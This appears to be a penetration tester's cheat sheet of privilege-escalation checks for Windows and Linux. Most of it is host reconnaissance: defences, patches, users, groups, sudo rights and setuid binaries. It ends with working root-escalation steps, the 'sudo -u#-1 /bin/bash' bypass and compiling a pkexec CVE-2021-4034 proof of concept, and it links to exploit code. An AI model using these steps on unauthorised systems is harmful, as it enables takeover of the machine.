---
icon: lucide/scroll-text
---

# Basic Priv Esc checks

## Windows
``` text
# Check if double homed
$ ipconfig /all

# Check arp cache to see who this host has been talking to
$ arp -a

# Check Windows Defender status
$ Get-MpComputerStatus

# List AppLocker rules
$ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Test AppLocker policy
$ Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

FilePath                    PolicyDecision MatchingRule
--------                    -------------- ------------
C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe

# List current applications running
$ tasklist /svc

# List env variables (incl. PATH)
$ set

# Get system info, including hotfixes. Search for KBs here https://www.catalog.update.microsoft.com/Search.aspx?q=hotfix to know when it was last patched
# Or save output and feed it to Windows Exploit Suggester (WES)
$ systeminfo

<snip>
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB5001078
                           [03]: KB4103723
<snip>

# If system info doesn't give us hotfixes, we can try wmic
$ wmic qfe

# Powershell option
$ Get-HotFix | ft -AutoSize

# Get list of installed programmes
$ wmic product get name

# Powershell option
$ Get-WmiObject -Class Win32_Product |  select Name, Version

# Show open ports
$ netstat -ano

# See if there are any other active users
$ query user

# Get username
$ echo %USERNAME%

# Get user privileges
$ whoami /priv

# Get groups
$ whoami /groups

# Get all users
$ net user

# Get description for users
Get-LocalUser

# Get description for host
Get-WmiObject -Class Win32_OperatingSystem | select Description

# Get all groups
$ net localgroup

# Get details on a specific group (e.g., administrators)
$ net localgroup administrators

# Password policy and other stuff
$ net accounts
```

## Linux
``` text
# Check history
history 

# get user
whoami 

# what groups do we belong to. Check hacktricks for interesting groups.
id

# what groups exist
cat /etc/group 

# get users of a specific group (e.g., sudo)
getent group sudo

# sometimes naming convention can tell us something
hostname 

# OS version
cat /etc/os-release 

# check kernel and google for CVE
uname -a 

# alternative to the above
cat /proc/version 

# check path
echo $PATH 

# check if any environment variables are sensitive
env 

# CPU type and version
lscpu 

# available login shells
cat /etc/shells 

# check if vuln
screen --version 

# check if vuln
logrotate --version 

# Check what processes are running as root
ps aux | grep root 

# Check other users logged in (lateral movement)
ps au 


# Check sudo privileges
sudo -l 
# if env_keep+=LD_PRELOAD is there (end of first line), read abou libraries 

# Check sudo version for vulnerabilities
sudo -V 

# search for binaries with setuid
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# search for set group id
find / -uid 0 -perm -6000 -type f 2>/dev/null

find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

# sudo versions vulnerable to CVE-2021-3156
# 1.8.31 - Ubuntu 20.04
# 1.8.27 - Debian 10
# 1.9.2 - Fedora 33
# use: https://github.com/blasty/CVE-2021-3156

# sudo versions < 1.8.28 that have "ALL" (in any way) in sudo -l
sudo -u#-1 /bin/bash

# polkit versions prior to 121 have a pkexec vuln
# use: https://github.com/arthepsy/CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc
```
